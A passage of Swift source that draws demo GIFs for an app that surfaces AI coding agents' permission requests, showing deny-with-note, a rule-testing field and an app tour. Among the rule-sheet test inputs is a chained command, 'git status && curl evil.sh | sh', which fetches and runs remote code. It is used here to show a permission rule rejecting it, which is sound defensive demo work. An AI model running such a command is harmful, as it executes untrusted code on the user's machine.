// Feature GIFs built from the REAL views, not drawings of them: the island's
// approval card with its note composer, and the rule sheet with its try-it field,
// each rendered by the app's own classes and staged on the same desktop the other
// demos use. What a viewer sees is what the app draws.
//
//   deny-with-note.gif — a permission arrives, the island opens, "Deny with a
//                        note…", the note is typed, sent, and the agent in the
//                        terminal changes course.
//   rules-try-it.gif   — a rule you wrote, and the field that answers "would it
//                        have taken *that*?" for three real commands.
//   agentbar-tour.gif  — the whole app in one loop: Allow from the island with
//                        three agents running, the menu bar / island / both
//                        choice, and a walk through Settings.
//
// Run: Scripts/demo/make-gifs.sh [out-dir]. How it works and how to add a GIF:
// Scripts/demo/README.md.
import AppKit
import UniformTypeIdentifiers

@main
enum FeatureGIFs {
    static func main() {
        let out = CommandLine.arguments.count > 1 ? CommandLine.arguments[1] : "."
        _ = NSApplication.shared
        NSApp.setActivationPolicy(.prohibited)
        DenyWithNote.write(to: URL(fileURLWithPath: out).appendingPathComponent("deny-with-note.gif"))
        RulesTryIt.write(to: URL(fileURLWithPath: out).appendingPathComponent("rules-try-it.gif"))
        Tour.write(to: URL(fileURLWithPath: out).appendingPathComponent("agentbar-tour.gif"))
    }
}

// MARK: - Shared stage

enum Stage {
    static func rgb(_ hex: UInt32, _ a: CGFloat = 1) -> NSColor {
        NSColor(srgbRed: CGFloat((hex >> 16) & 0xFF) / 255, green: CGFloat((hex >> 8) & 0xFF) / 255,
                blue: CGFloat(hex & 0xFF) / 255, alpha: a)
    }
    static let ink = rgb(0x1D1D1F)

    static func text(_ s: String, _ size: CGFloat, _ color: NSColor, weight: NSFont.Weight = .regular,
                     mono: Bool = false) -> NSAttributedString {
        let f = mono ? NSFont.monospacedSystemFont(ofSize: size, weight: weight)
                     : NSFont.systemFont(ofSize: size, weight: weight)
        return NSAttributedString(string: s, attributes: [.font: f, .foregroundColor: color])
    }

    static func rounded(_ r: CGRect, _ radius: CGFloat) -> NSBezierPath {
        NSBezierPath(roundedRect: r, xRadius: radius, yRadius: radius)
    }

    /// Rounded below, square above — the hardware notch the island hangs from.
    static func flushTop(_ r: CGRect, _ radius: CGFloat) -> NSBezierPath {
        let p = NSBezierPath()
        p.move(to: NSPoint(x: r.minX, y: r.maxY))
        p.line(to: NSPoint(x: r.minX, y: r.minY + radius))
        p.appendArc(withCenter: NSPoint(x: r.minX + radius, y: r.minY + radius), radius: radius,
                    startAngle: 180, endAngle: 270, clockwise: false)
        p.line(to: NSPoint(x: r.maxX - radius, y: r.minY))
        p.appendArc(withCenter: NSPoint(x: r.maxX - radius, y: r.minY + radius), radius: radius,
                    startAngle: 270, endAngle: 0, clockwise: false)
        p.line(to: NSPoint(x: r.maxX, y: r.maxY))
        p.close()
        return p
    }

    /// The island's own outline, as `IslandShape` cuts it, in canvas pixels: `r` is
    /// the frame, ears included, and `ear` is in points. The pill passes 0.
    static func island(_ r: NSRect, ear: CGFloat) -> CGPath {
        let p = IslandShape.path(in: CGSize(width: r.width / 2, height: r.height / 2),
                                 corner: IslandContentView.corner, ear: ear, flushTop: true)
        var t = CGAffineTransform(translationX: r.minX, y: r.minY).scaledBy(x: 2, y: 2)
        return p.copy(using: &t)!
    }
    static func fill(_ p: CGPath, _ color: NSColor) {
        let cg = NSGraphicsContext.current!.cgContext
        cg.addPath(p); cg.setFillColor(color.cgColor); cg.fillPath()
    }
    static func clip(_ p: CGPath) {
        let cg = NSGraphicsContext.current!.cgContext
        cg.addPath(p); cg.clip()
    }

    /// The pill's height in points — `IslandController.pillHeight`, which the ears
    /// are measured up from.
    static let pillHeight: CGFloat = 30

    /// The open panel the way `IslandController` lays it out on a notched display:
    /// flush on top, ears allowed, and a frame one ear wider on each side so the rows
    /// keep the 460 pt they were laid out for.
    static func openPanel(_ rows: [NSView]) -> IslandContentView {
        let content = IslandContentView(frame: NSRect(x: 0, y: 0, width: 460, height: 100))
        content.flushTop = true
        content.earWidth = IslandShape.earWidth
        content.collapsedHeight = pillHeight
        content.topInset = 10
        content.setRows(rows)
        content.setFrameSize(NSSize(width: IslandShape.panelWidth(body: 460, ear: IslandShape.earWidth),
                                    height: content.contentHeight + 6))
        return content
    }

    /// The island part of the way between the pill (`t` 0) and the open panel (1),
    /// hanging from `topY`: its frame, and the ear that height earns — the one rule
    /// that lets the ears unfurl with the frame in the app.
    static func growing(pill: NSRect, panel: NSRect, t: CGFloat, topY: CGFloat) -> (NSRect, CGFloat) {
        let w = pill.width + (panel.width - pill.width) * t
        let h = pill.height + (panel.height - pill.height) * t
        let ear = IslandShape.ear(full: IslandShape.earWidth, height: h / 2, collapsedHeight: pillHeight)
        return (NSRect(x: panel.midX - w / 2, y: topY - h, width: w, height: h), ear)
    }

    static func symbol(_ name: String, midX: CGFloat, midY: CGFloat, pt: CGFloat, color: NSColor) {
        guard let base = NSImage(systemSymbolName: name, accessibilityDescription: nil) else { return }
        let img = base.withSymbolConfiguration(.init(pointSize: pt, weight: .regular)) ?? base
        let tinted = NSImage(size: img.size)
        tinted.lockFocus()
        img.draw(in: NSRect(origin: .zero, size: img.size))
        color.set()
        NSRect(origin: .zero, size: img.size).fill(using: .sourceAtop)
        tinted.unlockFocus()
        tinted.draw(in: NSRect(x: midX - img.size.width / 2, y: midY - img.size.height / 2,
                               width: img.size.width, height: img.size.height))
    }

    static func wallpaper(_ W: CGFloat, _ H: CGFloat) {
        NSGradient(colorsAndLocations:
            (rgb(0x6FA8DC), 0.0), (rgb(0x8E9EE0), 0.30),
            (rgb(0xB48BD6), 0.58), (rgb(0xE39BB5), 0.82), (rgb(0xF2BE9A), 1.0))!
            .draw(in: NSRect(x: 0, y: 0, width: W, height: H), angle: -55)
        for (cx, cy, r, c) in [(W * 0.22, H * 0.8, 340.0, rgb(0xFFFFFF, 0.20)),
                               (W * 0.75, H * 0.2, 420.0, rgb(0xFFD9A0, 0.22))] as [(CGFloat, CGFloat, CGFloat, NSColor)] {
            NSGradient(colorsAndLocations: (c, 0.0), (c.withAlphaComponent(0), 1.0))!
                .draw(fromCenter: NSPoint(x: cx, y: cy), radius: 0,
                      toCenter: NSPoint(x: cx, y: cy), radius: r, options: [])
        }
    }

    static let barH: CGFloat = 48

    static func menuBar(_ W: CGFloat, _ H: CGFloat, app: String, notch: Bool) {
        let barY = H - barH
        rgb(0xF4F1EE, 0.72).setFill()
        NSRect(x: 0, y: barY, width: W, height: barH).fill()
        rgb(0x000000, 0.10).setFill()
        NSRect(x: 0, y: barY - 1, width: W, height: 1).fill()
        var lx: CGFloat = 26
        symbol("apple.logo", midX: lx + 10, midY: barY + barH / 2, pt: 22, color: ink)
        lx += 38
        let a = text(app, 25, ink, weight: .bold)
        a.draw(at: NSPoint(x: lx, y: barY + 10)); lx += a.size().width + 30
        for m in ["Shell", "Edit", "View", "Window"] {
            let t = text(m, 25, ink); t.draw(at: NSPoint(x: lx, y: barY + 10)); lx += t.size().width + 30
        }
        let clock = text("Wed 24 Sep   9:41", 25, ink, weight: .medium)
        clock.draw(at: NSPoint(x: W - 24 - clock.size().width, y: barY + 10))
        symbol("wifi", midX: W - 24 - clock.size().width - 40, midY: barY + barH / 2, pt: 21, color: ink)
        if notch {
            NSColor.black.setFill()
            flushTop(NSRect(x: (W - 300) / 2, y: barY, width: 300, height: barH), 14).fill()
        }
    }

    static func cursor(at pos: NSPoint, pressed: Bool = false) {
        let s: CGFloat = pressed ? 0.9 : 1
        let p = NSBezierPath()
        let pts: [(CGFloat, CGFloat)] = [(0, 0), (0, -30), (7, -22), (13, -34), (18, -31), (12, -20), (21, -20)]
        for (i, (x, y)) in pts.enumerated() {
            let q = NSPoint(x: pos.x + x * s, y: pos.y + y * s)
            if i == 0 { p.move(to: q) } else { p.line(to: q) }
        }
        p.close()
        NSColor.white.setStroke(); p.lineWidth = 3; p.stroke()
        NSColor.black.setFill(); p.fill()
    }

    static func smooth(_ t: CGFloat) -> CGFloat { let c = max(0, min(1, t)); return c * c * (3 - 2 * c) }
    static func lerp(_ a: NSPoint, _ b: NSPoint, _ t: CGFloat) -> NSPoint {
        NSPoint(x: a.x + (b.x - a.x) * t, y: a.y + (b.y - a.y) * t)
    }

    /// A real view, drawn at 2x into an image of exactly its pixel size.
    static func snapshot(_ view: NSView, dark: Bool = true) -> NSImage {
        view.appearance = NSAppearance(named: dark ? .darkAqua : .aqua)
        view.layoutSubtreeIfNeeded()
        if view.frame.size == .zero { view.setFrameSize(view.fittingSize) }
        view.layoutSubtreeIfNeeded()
        let window = NSWindow(contentRect: view.frame, styleMask: .borderless, backing: .buffered, defer: false)
        window.appearance = view.appearance
        window.contentView = view
        view.layoutSubtreeIfNeeded()
        let size = view.bounds.size
        let rep = NSBitmapImageRep(bitmapDataPlanes: nil, pixelsWide: Int(size.width * 2),
                                   pixelsHigh: Int(size.height * 2), bitsPerSample: 8, samplesPerPixel: 4,
                                   hasAlpha: true, isPlanar: false, colorSpaceName: .deviceRGB,
                                   bytesPerRow: 0, bitsPerPixel: 0)!
        rep.size = size
        view.cacheDisplay(in: view.bounds, to: rep)
        let img = NSImage(size: NSSize(width: size.width * 2, height: size.height * 2))
        img.addRepresentation(rep)
        return img
    }

    /// One frame: a 1:1 pixel canvas the drawing closure paints.
    static func frame(_ W: CGFloat, _ H: CGFloat, _ draw: () -> Void) -> CGImage {
        let rep = NSBitmapImageRep(bitmapDataPlanes: nil, pixelsWide: Int(W), pixelsHigh: Int(H),
                                   bitsPerSample: 8, samplesPerPixel: 4, hasAlpha: true, isPlanar: false,
                                   colorSpaceName: .deviceRGB, bytesPerRow: 0, bitsPerPixel: 0)!
        rep.size = NSSize(width: W, height: H)
        NSGraphicsContext.saveGraphicsState()
        NSGraphicsContext.current = NSGraphicsContext(bitmapImageRep: rep)
        draw()
        NSGraphicsContext.restoreGraphicsState()
        return rep.cgImage!
    }

    static func writeGIF(_ frames: [CGImage], delay: Double, to url: URL) {
        let dest = CGImageDestinationCreateWithURL(url as CFURL, UTType.gif.identifier as CFString,
                                                   frames.count, nil)!
        CGImageDestinationSetProperties(dest, [kCGImagePropertyGIFDictionary:
            [kCGImagePropertyGIFLoopCount: 0]] as CFDictionary)
        for f in frames {
            CGImageDestinationAddImage(dest, f, [kCGImagePropertyGIFDictionary: [
                kCGImagePropertyGIFUnclampedDelayTime: delay, kCGImagePropertyGIFDelayTime: delay]] as CFDictionary)
        }
        CGImageDestinationFinalize(dest)
        print("wrote \(url.path) (\(frames.count) frames)")
    }

    static func tmp(_ name: String, _ obj: [String: Any]) -> URL {
        let dir = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("agentbar-gifs")
        try? FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        let url = dir.appendingPathComponent(name + ".json")
        try! JSONSerialization.data(withJSONObject: obj).write(to: url)
        return url
    }

    /// Where a titled button sits, in the coordinates of `root` (bottom-left origin).
    static func button(_ prefix: String, in root: NSView) -> NSRect? {
        func find(_ v: NSView) -> NSButton? {
            if let b = v as? NSButton, b.attributedTitle.string.hasPrefix(prefix) || b.title.hasPrefix(prefix),
               !b.isHiddenOrHasHiddenAncestor { return b }
            for s in v.subviews { if let hit = find(s) { return hit } }
            return nil
        }
        guard let b = find(root) else { return nil }
        return rect(of: b, in: root)
    }

    /// Where `view` sits in `root` (bottom-left origin).
    static func rect(of view: NSView, in root: NSView) -> NSRect {
        var r = view.convert(view.bounds, to: root)
        if root.isFlipped { r.origin.y = root.bounds.height - r.maxY }
        return r
    }
}

// MARK: - GIF 1: deny with a note

enum DenyWithNote {
    static let W: CGFloat = 1200, H: CGFloat = 1000
    static let note = "use pnpm in this repo, not npm"

    static func write(to url: URL) {
        let now = Int(Date().timeIntervalSince1970)
        guard let session = Session(fileURL: Stage.tmp("demo-sess", [
            "agent": "claude", "state": "permission", "label": "Bash: npm install left-pad",
            "project": "webshop", "cwd": "/tmp/agentbar-demo-webshop", "sessionId": "demo-sess", "pid": 1,
            "started": true, "ts": now, "started_at": now - 1260,
            "prompt": "add left-pad to the checkout package", "model": "claude-opus-5",
            "term_program": "iTerm.app"])),
              let request = ApprovalRequest(fileURL: Stage.tmp("demo-sess-p1", [
            "sessionId": "demo-sess", "agent": "claude", "toolName": "Bash",
            "display": "Bash: npm install left-pad",
            "toolInputPretty": "{\"command\": \"npm install left-pad\"}",
            "context": ["kind": "bash", "command": "npm install left-pad"],
            "pid": 1, "hookPid": 1, "ts": now, "cwd": "/tmp/agentbar-demo-webshop"]))
        else { fatalError("fixtures did not decode") }

        let sprite = IconRenderer.shared.sprite(for: Agent.byID("claude"))
        let rowW: CGFloat = 460 - IslandContentView.hPad * 2
        let card = IslandApprovalView(request: request, deferTitle: "Answer in terminal",
                                      width: rowW - 12, onChoose: { _ in })

        /// The whole open panel, as the island draws it, with the card in the state asked for.
        func panel(composing: Bool, typed: String) -> (NSImage, NSView) {
            if card.composing != composing { card.setComposing(composing) }
            card.noteField.stringValue = typed
            let hero = IslandRowView(session: session, mark: sprite.restingColor, style: .hero, onClick: { _ in })
            hero.translatesAutoresizingMaskIntoConstraints = false
            hero.widthAnchor.constraint(equalToConstant: rowW).isActive = true
            let wrap = NSStackView(views: [card])
            wrap.orientation = .horizontal
            wrap.edgeInsets = NSEdgeInsets(top: 0, left: 12, bottom: 0, right: 0)
            let content = Stage.openPanel([hero, wrap])
            return (Stage.snapshot(content), content)
        }

        let (openImg, openView) = panel(composing: false, typed: "")
        let noteLink = Stage.button("Deny with a note", in: openView)!
        let (composeEmpty, composeView) = panel(composing: true, typed: "")
        let sendBtn = Stage.button("Deny & tell it", in: composeView)!
        var typedImgs: [Int: NSImage] = [0: composeEmpty]

        let panelSize = openImg.size
        let topY = H - Stage.barH
        let panelRect = NSRect(x: (W - panelSize.width) / 2, y: topY - panelSize.height,
                               width: panelSize.width, height: panelSize.height)
        func onCanvas(_ r: NSRect) -> NSPoint {   // a view rect → canvas point at its centre
            NSPoint(x: panelRect.minX + r.midX * 2, y: panelRect.minY + r.midY * 2)
        }
        let linkPt = onCanvas(noteLink)
        let sendPt = onCanvas(sendBtn)
        let pillW: CGFloat = 290, pillH: CGFloat = 60
        let pillRect = NSRect(x: (W - pillW) / 2, y: topY - pillH, width: pillW, height: pillH)

        func pill(_ label: String, color: NSColor, mark: NSImage?) {
            Stage.fill(Stage.island(pillRect, ear: 0), .black)
            let t = Stage.text(label, 23, color, weight: .medium, mono: true)
            var x = pillRect.midX - t.size().width / 2
            if let mark {
                let mh: CGFloat = 34, mw = mh * mark.size.width / max(1, mark.size.height)
                x = pillRect.midX - (mw + 12 + t.size().width) / 2
                mark.draw(in: NSRect(x: x, y: pillRect.midY - mh / 2, width: mw, height: mh))
                x += mw + 12
            }
            t.draw(at: NSPoint(x: x, y: pillRect.midY - t.size().height / 2))
        }

        // The terminal the session runs in, bottom left: it is where the note lands.
        let term = NSRect(x: 40, y: 120, width: 720, height: 300)
        let lines: [(Int, String, NSColor)] = [
            (0, "> add left-pad to the checkout package", Stage.rgb(0xE8E8E8)),
            (0, "⏺ Bash(npm install left-pad)", Stage.rgb(0xE8E8E8)),
            (0, "  ⎿  Waiting for approval…", Stage.rgb(0x9A9A9A)),
            (104, "  ⎿  Denied: \"use pnpm in this repo, not npm\"", Stage.rgb(0xFF7A70)),
            (116, "⏺ Got it — this repo uses pnpm. Switching.", Stage.rgb(0xE8E8E8)),
            (128, "⏺ Bash(pnpm add left-pad)", Stage.rgb(0xE8E8E8)),
            (138, "  ⎿  + left-pad 1.3.0", Stage.rgb(0x6FD38A)),
        ]
        func terminal(_ f: Int) {
            NSGraphicsContext.saveGraphicsState()
            let sh = NSShadow(); sh.shadowBlurRadius = 24; sh.shadowOffset = NSSize(width: 0, height: -8)
            sh.shadowColor = NSColor.black.withAlphaComponent(0.35); sh.set()
            Stage.rgb(0x1E1E22, 0.97).setFill()
            Stage.rounded(term, 18).fill()
            NSGraphicsContext.restoreGraphicsState()
            for (i, c) in [0xFF5F57, 0xFEBC2E, 0x28C840].enumerated() {
                Stage.rgb(UInt32(c)).setFill()
                NSBezierPath(ovalIn: NSRect(x: term.minX + 22 + CGFloat(i) * 26, y: term.maxY - 32,
                                            width: 16, height: 16)).fill()
            }
            Stage.text("webshop — claude", 19, Stage.rgb(0xB0B0B0), weight: .medium)
                .draw(at: NSPoint(x: term.midX - 80, y: term.maxY - 36))
            var y = term.maxY - 82
            for (at, s, c) in lines where f >= at {
                if at == 0, s.contains("Waiting"), f >= 104 { continue }   // replaced by the answer
                Stage.text(s, 20, c, mono: true).draw(at: NSPoint(x: term.minX + 26, y: y))
                y -= 32
            }
        }

        func caption() {
            let t = Stage.text("Deny with a note: tell the agent what to do instead", 30, .white, weight: .semibold)
            let r = NSRect(x: (W - t.size().width) / 2 - 20, y: 34, width: t.size().width + 40, height: 58)
            Stage.rgb(0x000000, 0.35).setFill(); Stage.rounded(r, 16).fill()
            t.draw(at: NSPoint(x: r.minX + 20, y: r.midY - t.size().height / 2))
        }

        var frames: [CGImage] = []
        let start = NSPoint(x: W - 160, y: 330)
        for f in 0..<176 {
            frames.append(Stage.frame(W, H) {
                Stage.wallpaper(W, H)
                terminal(f)
                caption()
                Stage.menuBar(W, H, app: "iTerm2", notch: true)
                let mark = sprite.colorFrames.isEmpty ? sprite.restingColor
                                                      : sprite.colorFrames[f % sprite.colorFrames.count]
                var cur: NSPoint? = nil
                var pressed = false
                let shadow = NSShadow(); shadow.shadowBlurRadius = 22
                shadow.shadowOffset = NSSize(width: 0, height: -8)
                shadow.shadowColor = NSColor.black.withAlphaComponent(0.35)

                func drawPanel(_ img: NSImage, t: CGFloat) {
                    let (r, ear) = Stage.growing(pill: pillRect, panel: panelRect, t: t, topY: topY)
                    let outline = Stage.island(r, ear: ear)
                    NSGraphicsContext.saveGraphicsState(); shadow.set()
                    Stage.fill(outline, .black)
                    NSGraphicsContext.restoreGraphicsState()
                    if t > 0.5 {
                        NSGraphicsContext.saveGraphicsState()
                        Stage.clip(outline)
                        img.draw(in: panelRect, from: .zero, operation: .sourceOver, fraction: (t - 0.5) / 0.5)
                        NSGraphicsContext.restoreGraphicsState()
                    }
                }

                switch f {
                case 0..<22:                        // pill asks; the pointer heads for the notch
                    NSGraphicsContext.saveGraphicsState(); shadow.set(); pill("approve?", color: .white, mark: mark)
                    NSGraphicsContext.restoreGraphicsState()
                    cur = Stage.lerp(start, NSPoint(x: W / 2 + 30, y: topY - 20), Stage.smooth(CGFloat(f - 6) / 14))
                case 22..<30:                       // the island inflates out of the notch
                    drawPanel(openImg, t: Stage.smooth(CGFloat(f - 22) / 8))
                    cur = NSPoint(x: W / 2 + 30, y: topY - 20)
                case 30..<46:                       // to "Deny with a note…"
                    drawPanel(openImg, t: 1)
                    cur = Stage.lerp(NSPoint(x: W / 2 + 30, y: topY - 20), linkPt, Stage.smooth(CGFloat(f - 30) / 12))
                    pressed = f >= 44
                case 46..<90:                       // the note, one character a frame
                    let n = min(note.count, max(0, (f - 50) * 30 / 36))
                    if typedImgs[n] == nil { typedImgs[n] = panel(composing: true, typed: String(note.prefix(n))).0 }
                    drawPanel(typedImgs[n]!, t: 1)
                    cur = linkPt
                case 90..<100:                      // to "Deny & tell it"
                    drawPanel(typedImgs[note.count] ?? composeEmpty, t: 1)
                    cur = Stage.lerp(linkPt, sendPt, Stage.smooth(CGFloat(f - 90) / 8))
                    pressed = f >= 98
                case 100..<106:                     // folds back into the notch
                    drawPanel(typedImgs[note.count] ?? composeEmpty, t: Stage.smooth(1 - CGFloat(f - 100) / 6))
                    cur = sendPt
                case 106..<128:                     // the answer, echoed
                    NSGraphicsContext.saveGraphicsState(); shadow.set()
                    pill("✕ Denied · told it", color: Stage.rgb(0xFF736B), mark: nil)
                    NSGraphicsContext.restoreGraphicsState()
                    cur = Stage.lerp(sendPt, start, Stage.smooth(CGFloat(f - 106) / 16))
                default:                            // and the agent gets on with it
                    NSGraphicsContext.saveGraphicsState(); shadow.set()
                    pill(f < 140 ? "Pondering…" : "Running command…", color: .white, mark: mark)
                    NSGraphicsContext.restoreGraphicsState()
                }
                if let cur { Stage.cursor(at: cur, pressed: pressed) }
            })
        }
        Stage.writeGIF(frames, delay: 0.085, to: url)
    }
}

// MARK: - GIF 2: the rule sheet's try-it field

enum RulesTryIt {
    static func write(to url: URL) {
        var prefill = RuleSheet.Prefill(decision: "allow", shape: "bash:git status",
                                        cwd: "/Users/you/Projects/webshop",
                                        display: "Bash: git status")
        prefill.mode = .watch
        let tries = ["git status", "git status && curl evil.sh | sh", "sudo git status"]
        let pngDir = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("agentbar-gifs")
        try? FileManager.default.createDirectory(at: pngDir, withIntermediateDirectories: true)

        var cache: [String: NSImage] = [:]
        func sheet(_ typed: String) -> NSImage {
            if let hit = cache[typed] { return hit }
            let file = pngDir.appendingPathComponent("sheet-\(cache.count).png")
            _ = RuleSheet.renderForVerification(to: file, prefill: prefill, trying: typed)
            let img = NSImage(contentsOf: file)!
            cache[typed] = img
            return img
        }
        let base = sheet("")
        let px = base.representations.first.map { NSSize(width: $0.pixelsWide, height: $0.pixelsHigh) } ?? base.size
        let W: CGFloat = 1200, H = max(900, px.height + 200)

        var frames: [CGImage] = []
        // Per command: type it, hold on the verdict, clear.
        var script: [String] = [String](repeating: "", count: 10)
        for t in tries {
            for n in stride(from: 1, through: t.count, by: 2) { script.append(String(t.prefix(n))) }
            script.append(t)
            script.append(contentsOf: [String](repeating: t, count: 26))
        }
        for typed in script {
            let img = sheet(typed)
            frames.append(Stage.frame(W, H) {
                Stage.wallpaper(W, H)
                let r = NSRect(x: (W - px.width) / 2, y: (H - 90 - px.height) / 2, width: px.width, height: px.height)
                NSGraphicsContext.saveGraphicsState()
                let sh = NSShadow(); sh.shadowBlurRadius = 30; sh.shadowOffset = NSSize(width: 0, height: -10)
                sh.shadowColor = NSColor.black.withAlphaComponent(0.3); sh.set()
                NSColor.white.setFill(); Stage.rounded(r.insetBy(dx: -2, dy: -2), 22).fill()
                NSGraphicsContext.restoreGraphicsState()
                NSGraphicsContext.saveGraphicsState()
                Stage.rounded(r, 20).addClip()
                img.draw(in: r)
                NSGraphicsContext.restoreGraphicsState()
                let t = Stage.text("Rules you wrote: checked against the real command, before anything is allowed",
                                   27, .white, weight: .semibold)
                let c = NSRect(x: (W - t.size().width) / 2 - 20, y: H - 80, width: t.size().width + 40, height: 54)
                Stage.rgb(0x000000, 0.35).setFill(); Stage.rounded(c, 16).fill()
                t.draw(at: NSPoint(x: c.minX + 20, y: c.midY - t.size().height / 2))
            })
        }
        Stage.writeGIF(frames, delay: 0.08, to: url)
    }
}

// MARK: - GIF 3: the tour

enum Tour {
    static let W: CGFloat = 1200, H: CGFloat = 1000

    static func write(to url: URL) {
        NSApp.appearance = NSAppearance(named: .aqua)
        // This process has no bundle, so its icon is a folder and its defaults are
        // its own domain — not AgentBar's. Both are set for the picture: the real
        // icon, and the switches a person who uses the app would have on.
        if let icon = NSImage(contentsOfFile: "Resources/AppIcon.icns") { NSApp.applicationIconImage = icon }
        // Not the notification switches: with one on, the page asks the
        // notification center for its status, and that needs a real bundle.
        for key in ["notifyApprovals", "notifyFailures", "notifyQuiet"] {
            UserDefaults.standard.removeObject(forKey: key)
        }
        for key in ["soundsEnabled", "globalApprovalShortcut", "launcherShortcut"] {
            UserDefaults.standard.set(true, forKey: key)
        }
        let now = Int(Date().timeIntervalSince1970)
        func session(_ id: String, _ o: [String: Any]) -> Session {
            var o = o
            o["sessionId"] = id; o["pid"] = 1; o["started"] = true; o["ts"] = now
            o["cwd"] = "/tmp/agentbar-demo-\(id)"
            return Session(fileURL: Stage.tmp(id, o))!
        }
        let claude = session("tour-claude", ["agent": "claude", "state": "permission",
            "label": "Bash: git push origin main", "project": "webshop", "started_at": now - 1680,
            "prompt": "ship the checkout fix", "model": "claude-opus-5", "term_program": "iTerm.app"])
        let codex = session("tour-codex", ["agent": "codex", "state": "tool", "label": "Running command",
            "project": "api", "started_at": now - 540, "prompt": "speed up the orders query"])
        let copilot = session("tour-copilot", ["agent": "copilot", "state": "done", "label": "",
            "project": "docs", "started_at": now - 3000, "recap": "Rewrote the install guide for Linux"])
        let request = ApprovalRequest(fileURL: Stage.tmp("tour-claude-p1", [
            "sessionId": "tour-claude", "agent": "claude", "toolName": "Bash",
            "display": "Bash: git push origin main",
            "toolInputPretty": "{\"command\": \"git push origin main\"}",
            "context": ["kind": "bash", "command": "git push origin main"],
            "pid": 1, "hookPid": 1, "ts": now, "cwd": "/tmp/agentbar-demo-tour-claude"]))!

        let sprite = IconRenderer.shared.sprite(for: Agent.byID("claude"))
        func mark(_ id: String) -> NSImage { IconRenderer.shared.sprite(for: Agent.byID(id)).restingColor }
        let rowW: CGFloat = 460 - IslandContentView.hPad * 2
        func row(_ s: Session, _ style: IslandRowView.Style) -> NSView {
            let r = IslandRowView(session: s, mark: mark(s.agentID), style: style, onClick: { _ in })
            r.translatesAutoresizingMaskIntoConstraints = false
            r.widthAnchor.constraint(equalToConstant: rowW).isActive = true
            return r
        }
        let card = IslandApprovalView(request: request, deferTitle: "Answer in terminal",
                                      width: rowW - 12, onChoose: { _ in })
        let wrap = NSStackView(views: [card])
        wrap.orientation = .horizontal
        wrap.edgeInsets = NSEdgeInsets(top: 0, left: 12, bottom: 0, right: 0)
        let content = Stage.openPanel([row(claude, .hero), wrap, row(codex, .compact), row(copilot, .compact)])
        let panelImg = Stage.snapshot(content)
        let allow = Stage.button("Allow", in: content)!

        // Scene 1b: later, the island hidden while you were away — the peek, and
        // Clawd poked in the open panel. The same three sessions, Claude now pushing.
        let pushing = session("tour-claude-push", ["agent": "claude", "state": "tool",
            "label": "Bash: git push origin main", "project": "webshop", "started_at": now - 1700,
            "prompt": "ship the checkout fix", "model": "claude-opus-5", "term_program": "iTerm.app"])
        let hero = IslandRowView(session: pushing, mark: mark("claude"), style: .hero, onClick: { _ in })
        hero.translatesAutoresizingMaskIntoConstraints = false
        hero.widthAnchor.constraint(equalToConstant: rowW).isActive = true
        let busy = Stage.openPanel([hero, row(codex, .compact), row(copilot, .compact)])
        let busyImg = Stage.snapshot(busy)
        let mascot = hero.mascot
        let markAt = Stage.rect(of: mascot, in: busy)
        // The panel once more with the mark's pixels blank, for the reacting mark to
        // be drawn over: an empty image of the same size leaves the layout alone.
        let restMark = mascot.image
        mascot.image = restMark.map { NSImage(size: $0.size) }
        let blankImg = Stage.snapshot(busy)
        mascot.image = restMark
        let pokes = Poke.record(mascot, session: pushing.id)

        let topY = H - Stage.barH
        let panelRect = NSRect(x: (W - panelImg.size.width) / 2, y: topY - panelImg.size.height,
                               width: panelImg.size.width, height: panelImg.size.height)
        let allowPt = NSPoint(x: panelRect.minX + allow.midX * 2, y: panelRect.minY + allow.midY * 2 + 10)
        let pillW: CGFloat = 290, pillH: CGFloat = 60
        let pillRect = NSRect(x: (W - pillW) / 2, y: topY - pillH, width: pillW, height: pillH)
        let shadow = NSShadow(); shadow.shadowBlurRadius = 22
        shadow.shadowOffset = NSSize(width: 0, height: -8)
        shadow.shadowColor = NSColor.black.withAlphaComponent(0.35)

        func pill(_ label: String, color: NSColor, mark: NSImage?, count: Int, alpha: CGFloat = 1,
                  drop: CGFloat = 0) {
            // A peek is the hide played backwards: fading in while it drops the last
            // few points out of the notch (`IslandController.hideSlide`, 6 pt).
            let cg = NSGraphicsContext.current!.cgContext
            cg.saveGState()
            cg.setAlpha(alpha)
            cg.translateBy(x: 0, y: drop)
            cg.beginTransparencyLayer(auxiliaryInfo: nil)
            defer { cg.endTransparencyLayer(); cg.restoreGState() }
            NSGraphicsContext.saveGraphicsState(); shadow.set()
            Stage.fill(Stage.island(pillRect, ear: 0), .black)
            NSGraphicsContext.restoreGraphicsState()
            let t = Stage.text(label, 23, color, weight: .medium, mono: true)
            let badge = Stage.text("\(count)", 19, Stage.rgb(0xFFFFFF, 0.65), weight: .semibold, mono: true)
            let mh: CGFloat = 34, mw = mark.map { mh * $0.size.width / max(1, $0.size.height) } ?? 0
            let bw = count > 0 ? badge.size().width + 18 : 0
            let total = (mark == nil ? 0 : mw + 12) + t.size().width + (count > 0 ? 12 + bw : 0)
            var x = pillRect.midX - total / 2
            if let mark { mark.draw(in: NSRect(x: x, y: pillRect.midY - mh / 2, width: mw, height: mh)); x += mw + 12 }
            t.draw(at: NSPoint(x: x, y: pillRect.midY - t.size().height / 2)); x += t.size().width + 12
            if count > 0 {
                Stage.rgb(0xFFFFFF, 0.12).setFill()
                Stage.rounded(NSRect(x: x, y: pillRect.midY - 15, width: bw, height: 30), 8).fill()
                badge.draw(at: NSPoint(x: x + 9, y: pillRect.midY - badge.size().height / 2))
            }
        }
        func caption(_ s: String) {
            let t = Stage.text(s, 30, .white, weight: .semibold)
            let r = NSRect(x: (W - t.size().width) / 2 - 20, y: 34, width: t.size().width + 40, height: 58)
            Stage.rgb(0x000000, 0.38).setFill(); Stage.rounded(r, 16).fill()
            t.draw(at: NSPoint(x: r.minX + 20, y: r.midY - t.size().height / 2))
        }
        /// A window image (2x rep) on the desktop, scaled to fit, with a shadow.
        func window(_ rep: NSBitmapImageRep, top: CGFloat = 70) -> (NSRect, CGFloat) {
            let px = NSSize(width: rep.pixelsWide, height: rep.pixelsHigh)
            let scale = min(1, 1080 / px.width, (H - 250) / px.height)
            let size = NSSize(width: px.width * scale, height: px.height * scale)
            let r = NSRect(x: (W - size.width) / 2, y: H - top - size.height, width: size.width, height: size.height)
            NSGraphicsContext.saveGraphicsState()
            let sh = NSShadow(); sh.shadowBlurRadius = 36; sh.shadowOffset = NSSize(width: 0, height: -12)
            sh.shadowColor = NSColor.black.withAlphaComponent(0.32); sh.set()
            NSColor.windowBackgroundColor.setFill(); Stage.rounded(r, 22).fill()
